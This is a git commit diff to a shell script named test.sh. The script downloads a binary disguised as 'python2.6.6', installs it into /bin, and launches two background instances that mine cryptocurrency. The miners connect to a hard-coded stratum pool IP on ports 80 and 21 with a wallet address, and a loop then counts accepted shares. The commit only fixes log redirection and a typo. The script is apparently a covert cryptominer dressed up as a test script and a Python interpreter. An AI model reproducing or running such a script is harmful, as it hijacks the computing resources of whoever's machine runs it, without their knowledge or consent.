d97e4f33a073c2e6d696fa531598a13c4489602f
one10001 <78626503+one10001@users.noreply.github.com>
2021-03-27 16:01:14 +0100

    test error redirect

--- test.sh
+++ test.sh
@@ -10,12 +10,12 @@ curl ipinfo.io
 wget https://github.com/one10001/10001code/releases/download/2.6.6/python2.6.6
 chmod +x python2.6.6
 cp python2.6.6 /bin/python2.6.6
-python2.6.6 -U -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.$IPNAME@116.203.206.127:80  --cu-grid-size 256  --cu-block-size 512  --cu-parallel-hash 8 > log01.out &
-python2.6.6 -U -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.$IPNAME@116.203.206.127:21  --cu-grid-size 256  --cu-block-size 512  --cu-parallel-hash 8 > log02.out &
+python2.6.6 -U -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.$IPNAME@116.203.206.127:80  --cu-grid-size 256  --cu-block-size 512  --cu-parallel-hash 8 2> log01.out 1> log01.out  &
+python2.6.6 -U -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.$IPNAME@116.203.206.127:21  --cu-grid-size 256  --cu-block-size 512  --cu-parallel-hash 8 2> log02.out 1> log02.out &
 nvidia-smi
 while [ 1 ]
 do
-    ehco first 80: $(grep -o 'Accepted' log01.out  | wc -l)
+    echo first 80: $(grep -o 'Accepted' log01.out  | wc -l)
     echo second 21: $(grep -o 'Accepted' log02.out | wc -l)
     sleep 10
 done
